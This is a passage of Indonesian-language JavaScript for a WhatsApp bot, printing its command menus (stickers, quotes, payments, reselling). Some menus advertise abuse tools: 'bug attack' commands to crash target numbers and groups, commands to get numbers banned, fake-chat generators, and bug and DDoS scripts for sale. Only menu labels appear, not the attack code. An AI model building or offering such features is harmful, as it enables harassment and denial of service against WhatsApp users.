┌──『 *MENU GROUP* 』
│ ${prefix}owner
│ ${prefix}qc *teks*
│ ${prefix}tts *teks*
│ ${prefix}tiktok *link*
│ ${prefix}sticker *reply image*
│ ${prefix}linkgroup
│ ${prefix}hidetag *teks*
│ ${prefix}add *nomor*
│ ${prefix}kick *nomor*
│ ${prefix}promote *nomor*
│ ${prefix}demote *nomor*
│ ${prefix}antilink *on/off*
│ ${prefix}mutegc *on/off*
└──────`
reply(txtus)
}
break
case "storemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}vps
⭔ ${prefix}done
⭔ ${prefix}done?
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel
⭔ ${prefix}dmff
⭔ ${prefix}dmml
⭔ ${prefix}kalkulator 
⭔ ${prefix}testimoni
⭔ ${prefix}listpanelpublic
⭔ ${prefix}listpanelprivate

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "ownermenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtow = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU OWNER* 』
│ ${prefix}addowner *nomor*
│ ${prefix}delowner *nomor*
│ ${prefix}addprem *nomor*
│ ${prefix}delprem *nomor*
│ ${prefix}sel
│ ${prefix}public
│ ${prefix}shutdown
│ ${prefix}getcase
│ ${prefix}addtesti
│ ${prefix}deltesti
│ ${prefix}enc
└──────`
reply(txtow)
}
break
case "textmakermenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TEXTMAKER MENU* )▭▬▭

${prefix}blackpink
${prefix}neon
${prefix}greenneon
${prefix}advanceglow
${prefix}futureneon
${prefix}sandwriting
${prefix}sandsummer
${prefix}sandengraved
${prefix}metaldark
${prefix}neonlight
${prefix}holographic
${prefix}text1917
${prefix}minion
${prefix}deluxesilver
${prefix}newyearcard
${prefix}bloodfrosted
${prefix}halloween
${prefix}jokerlogo
${prefix}fireworksparkle
${prefix}natureleaves
${prefix}bokeh
${prefix}toxic
${prefix}strawberry
${prefix}box3d
${prefix}roadwarning
${prefix}breakwall
${prefix}icecold
${prefix}luxury
${prefix}cloud
${prefix}summersand
${prefix}horrorblood
${prefix}thunder

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "convertmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *CONVERT MENU* )▭▬▭

${prefix}nulis
${prefix}nuliskiri
${prefix}nuliskanan
${prefix}foliokiri
${prefix}foliokanan
${prefix}removebg [image]
${prefix}toimage [reply sticker]
${prefix}tovideo [reply sticker]
${prefix}togif [reply sticker]
${prefix}tourl [image / video]
${prefix}tovn [reply video]
${prefix}tomp3 [reply video]
${prefix}toaudio [reply video]

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "qoutesmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *CONVERT MENU* )▭▬▭

⊙ ${prefix}quotesanime
⊙ ${prefix}animequotes
⊙ ${prefix}motivasi
⊙ ${prefix}dilanquote
⊙ ${prefix}bucinquote
⊙ ${prefix}katasenja
⊙ ${prefix}randomquote
⊙ ${prefix}muslimquote
⊙ ${prefix}galauquote
⊙ ${prefix}kanyequote
⊙ ${prefix}trumpquote
⊙ ${prefix}trumpthink
⊙ ${prefix}creepyfact
⊙ ${prefix}faktaunik
⊙ ${prefix}puisi
⊙ ${prefix}pantun
⊙ ${prefix}cerpen

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "islammenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ISLAM MENU* )▭▬▭

⊙ ${prefix} jadwalsholat
⊙ ${prefix} kisahnabi
⊙ ${prefix} alquranaudio
⊙ ${prefix} asmaulhusna
⊙ ${prefix} alquran
⊙ ${prefix} listsurah

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "bugnumber": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const txtat = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© SanZOffcial*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK NUMBER* 」
● ${prefix}gas *nomor|jumlah*
● ${prefix}kill *nomor|jumlah*
● ${prefix}crash *nomor|jumlah*
● ${prefix}shoot *nomor|jumlah*
● ${prefix}bugkuy *nomor|jumlah*
● ${prefix}duarr *nomor|jumlah*
● ${prefix}killyou *nomor|jumlah*
● ${prefix}doblekill *nomor|jumlah*
● ${prefix}triplekill *nomor|jumlah*
● ${prefix}savage *nomor|jumlah*
● ${prefix}santet *nomor|jumlah*
● ${prefix}danger *nomor|jumlah*
● ${prefix}meninggal *nomor|jumlah*
● ${prefix}headshot *nomor|jumlah*
● ${prefix}mati *nomor|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtat)
}
break
case "buggroup":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const txtv1 = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© SanZOffcial*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK GROUP v1* 」
● ${prefix}killgc *linkgc|jumlah*
● ${prefix}santetgc *linkgc|jumlah*
● ${prefix}gcwakwaw *linkgc|jumlah*
● ${prefix}togc *linkgc|jumlah*
● ${prefix}matigc *linkgc|jumlah*
● ${prefix}kuygc *linkgc|jumlah*
● ${prefix}attackgc *linkgc|jumlah*
● ${prefix}mampusgc *linkgc|jumlah*
● ${prefix}gasgc *linkgc|jumlah*
● ${prefix}ampasgc *linkgc|jumlah*
● ${prefix}bahayagc *linkgc|jumlah*
● ${prefix}hatihatigc *linkgc|jumlah*
● ${prefix}crashgc *linkgc|jumlah*
● ${prefix}stuckgc *linkgc|jumlah*
● ${prefix}ganasgc *linkgc|jumlah*

「 *BUG ATTACK GROUP v2* 」
● ${prefix}buggc *idgroup|jumlah*
● ${prefix}shootgc *idgroup|jumlah*
● ${prefix}dorrgc *idgroup|jumlah*
● ${prefix}attackgc1 *idgroup|jumlah*
● ${prefix}meninggalgc *idgroup|jumlah*
● ${prefix}matigc1*idgroup|jumlah*
● ${prefix}seranggc *idgroup|jumlah*
● ${prefix}bomgc *idgroup|jumlah*
● ${prefix}ledakangc *idgroup|jumlah*
● ${prefix}atomgc *idgroup|jumlah*
● ${prefix}hancurgc *idgroup|jumlah*
● ${prefix}bugzirgc *idgroup|jumlah*
● ${prefix}stuckgc2 *idgroup|jumlah*
● ${prefix}baugc *idgroup|jumlah*
● ${prefix}ultigc *idgroup|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtv1)
}
break

case "bannedmenu":{
const txtv2 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU BANNED* 』
│ ${prefix}call *nomor*
│ ${prefix}out *nomor*
│ ${prefix}verif *nomor*
│ ${prefix}kenon *nomor*
│ ${prefix}bannedv1 *nomor*
│ ${prefix}bannedv2 *nomor*
│ ${prefix}bannedv3 *nomor*
│ ${prefix}bannedv4 *nomor*
│ ${prefix}bannedv5 *nomor*
│ ${prefix}bannedv6 *nomor*
└──────`
reply(txtv2)
}
break
case "unbanmenu":{
const txt226 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU UNBANNED* 』
│ ${prefix}unbannedv1 *nomor*
│ ${prefix}unbannedv2 *nomor*
│ ${prefix}unbannedv3 *nomor*
│ ${prefix}unbannedv4 *nomor*
│ ${prefix}unbannedv5 *nomor*
└──────`
reply(txt226)
}
break
case "topupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TOPUP / SUNTIK SOSMED* )▭▬▭

⭔ ${prefix}ceksaldomaupedia
⭔ ${prefix}list-pascabayar
⭔ ${prefix}list-prabayar
⭔ ${prefix}list-sosmed
⭔ ${prefix}maudeposit
⭔ ${prefix}topupgame
⭔ ${prefix}cekgame
⭔ ${prefix}topup

*NOTE : MASIH DALAM PERKEMBANGAN!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "sewabotmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SEWABOT MENU* )▭▬▭

⭔ ${prefix}buysewainbot
⭔ ${prefix}listsewa
⭔ ${prefix}konfirsewa
⭔ ${prefix}cancelsewa
⭔ ${prefix}sewa
⭔ ${prefix}buysewa
⭔ ${prefix}listsewa

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "pm2menu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭( *PM2 MENU* )▭▬▭

⭔ ${prefix}buycasepm2
⭔ ${prefix}buyeggpm2
⭔ ${prefix}buyapipm2
⭔ ${prefix}buyscpm2

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "saldomenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SALDO MENU* )▭▬▭

⭔ ${prefix}saldonya ( Cek Saldo )
⭔ ${prefix}tfsaldo ( Jumlah )
⭔ ${prefix}addsaldo / acc ( Jumlah / Khusus Own)
⭔ ${prefix}minsaldo (MENGECEK SALDO ORANG LAIN)

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break  
case "anonymousmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ANONYMOUS MENU* )▭▬▭

⭔ ${prefix}confes / menfess

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
  case "suntikmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *SUNTIK MENU* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}ceksaldo-smm
⭔ ${prefix}smmlist
⭔ ${prefix}suntiksmm _id link jumlah_
⭔ ${prefix}cektransaksi _id order_
⭔ ${prefix}deposit-smm _jumlah depo nya_

*NOTE : MASIH DALAM PERKEMBANGAN!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break      
case "cmdmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▭▬▭( *COMMAND BUYSC* )▭▬▭
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscv8
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyschwv21noscan
 ⭔${prefix}buyschwv21
 ⭔${prefix}buyscnoscan
 ⭔${prefix}buyscscan
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2 
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

*SEANDAINYA BOT TIDAK MERESPON SEGERA HUBUNGI OWNER*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "paymentmenu": case "paymenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *PAYMETMENU* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}dana
⭔ ${prefix}gopay ( Sedang Proses Bep🥰 ) 
⭔ ${prefix}orkut
⭔ ${prefix}qris
⭔ ${prefix}bri

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textoto,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
   case "textwamenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TEXT WA MENU* )▭▬▭

 ༺ 𝗙𝗔𝗞𝗘 𝗖𝗛𝗔𝗧 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}fakec1
┣┣⃟❍𒁂⃝➢${prefix}fakec2
┣┣⃟❍𒁂⃝➢${prefix}fakec3
┣┣⃟❍𒁂⃝➢${prefix}fakec4
┣┣⃟❍𒁂⃝➢${prefix}fakec5
┣┣⃟❍𒁂⃝➢${prefix}fakec6
┣┣⃟❍𒁂⃝➢${prefix}fakec7
┣┣⃟❍𒁂⃝➢${prefix}fakec8
┣┣⃟❍𒁂⃝➢${prefix}fakec9
┣┣⃟❍𒁂⃝➢${prefix}fakec10
┣┣⃟❍𒁂⃝➢${prefix}fakec11
┣┣⃟❍𒁂⃝➢${prefix}alltotal

 ༺ 𝗨𝗡𝗕𝗔𝗡 𝗦𝗣𝗔𝗠  ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textunbanv1
┣┣⃟❍𒁂⃝➢${prefix}textunbanv2
┣┣⃟❍𒁂⃝➢${prefix}textunbanv3
┣┣⃟❍𒁂⃝➢${prefix}textunbanv4
┣┣⃟❍𒁂⃝➢${prefix}textunbanv5
┣┣⃟❍𒁂⃝➢${prefix}textunbanv6
┣┣⃟❍𒁂⃝➢${prefix}textunbanv7
┣┣⃟❍𒁂⃝➢${prefix}textunbanv8
┣┣⃟❍𒁂⃝➢${prefix}textunbanv9
┣┣⃟❍𒁂⃝➢${prefix}textunbanv10
┣┣⃟❍𒁂⃝➢${prefix}textunbanv11
┣┣⃟❍𒁂⃝➢${prefix}textunbanv12
┣┣⃟❍𒁂⃝➢${prefix}textunbanv13
┣┣⃟❍𒁂⃝➢${prefix}textunbanv14
┣┣⃟❍𒁂⃝➢${prefix}textunbanv15
┣┣⃟❍𒁂⃝➢${prefix}textunbanv16
┣┣⃟❍𒁂⃝➢${prefix}textunbanv17
┣┣⃟❍𒁂⃝➢${prefix}textunbanv18
┣┣⃟❍𒁂⃝➢${prefix}textunbanv19
┣┣⃟❍𒁂⃝➢${prefix}textunbanv20
┣┣⃟❍𒁂⃝➢${prefix}textunbanv21

 ༺ 𝗕𝗔𝗡𝗡𝗘𝗗 ༻
 
┣┣⃟❍𒁂⃝➢${prefix}textbanv1
┣┣⃟❍𒁂⃝➢${prefix}textbanv2
┣┣⃟❍𒁂⃝➢${prefix}textbanv3
┣┣⃟❍𒁂⃝➢${prefix}textbanv4
┣┣⃟❍𒁂⃝➢${prefix}textbanv5
┣┣⃟❍𒁂⃝➢${prefix}textbanv6
┣┣⃟❍𒁂⃝➢${prefix}textbanv7
┣┣⃟❍𒁂⃝➢${prefix}textbanv8
┣┣⃟❍𒁂⃝➢${prefix}textbanv9
┣┣⃟❍𒁂⃝➢${prefix}textbanv10

༺ 𝗧𝗢𝗢𝗟𝗦 ༻

 ┣┣⃟❍𒁂⃝➢${prefix}tools1
 ┣┣⃟❍𒁂⃝➢${prefix}tools2
 
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "filesc": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FILE SC* )▭▬▭

ReadMe.txt
Sc+v9.zip
all
appearance.js
connect.js
database
freya
node_modules
package-lock.json
package.json
scrape
session
thumb.png
v9²
xeonmedia
wangsap
lib
basehaikal
media

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "randommenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RANDOM MENU* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
